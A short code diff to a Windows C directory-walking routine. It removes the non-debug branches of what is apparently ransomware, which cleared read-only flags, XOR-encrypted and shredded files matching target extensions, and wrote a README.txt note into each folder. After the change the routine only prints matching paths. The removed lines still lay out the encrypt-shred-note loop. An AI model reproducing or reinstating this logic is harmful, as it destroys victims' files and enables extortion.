@@ -208,26 +208,7 @@ static void search_engine_class_start(
 
                 if (bsearch(&currentFileExt, var->arrayOfFileExtensions, var->fileExtensionArraySize, sizeof(_TCHAR*), se_compare))
                 {
-#ifndef _DEBUG
-                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
-                        SetFileAttributes(currentFile, FILE_ATTRIBUTE_NORMAL);
-
-                    xor_class_t* xor_class_obj = xor_class_create(currentFile);
-                    if (xor_class_obj)
-                    {
-                        xor_class_obj->method->xor_encrypt(xor_class_obj);
-                        xor_class_obj->method->xor_destroy(xor_class_obj);
-                    }
-
-                    file_shredder_class_t* file_shredder_class_obj = file_shredder_class_create(currentFile);
-                    if (file_shredder_class_obj)
-                    {
-                        file_shredder_class_obj->method->fs_start(file_shredder_class_obj);
-                        file_shredder_class_obj->method->fs_destroy(file_shredder_class_obj);
-                    }
-#else
                     _tprintf(_T("%s\n"), currentFile);
-#endif
                 }
             }
 
@@ -235,18 +216,6 @@ static void search_engine_class_start(
                 !(findData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
                 !(findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)) 
             {
-#ifndef _DEBUG
-                _TCHAR README[MAX_PATH + 0x01];
-                _tcscpy_s(README, _countof(README), currentFile);
-                _tcscat_s(README, _countof(README), _T("\\README.txt"));
-
-                message_class_t* message_class_obj = message_class_create(README);
-                if (message_class_obj)
-                {
-                    message_class_obj->method->m_send(message_class_obj);
-                    message_class_obj->method->m_destroy(message_class_obj);
-                }
-#endif
                 search_engine_class_start(this, currentFile);
             }
         } while (FindNextFile(hFind, &findData));
